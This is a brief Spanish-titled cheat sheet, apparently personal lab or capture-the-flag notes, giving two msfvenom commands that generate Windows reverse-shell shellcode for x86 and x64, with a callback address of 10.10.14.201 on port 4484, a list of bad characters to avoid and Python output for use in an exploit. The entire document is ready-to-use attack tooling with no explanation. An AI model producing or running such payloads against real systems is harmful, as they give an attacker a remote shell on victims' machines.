
# Crear shellcode 

### x86

```ruby
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.201 LPORT=4484 \
EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode \
-a x86 --platform windows
```
### x64 

```ruby
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.201 LPORT=4484 \
EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode \
-a x64 --platform windows
```



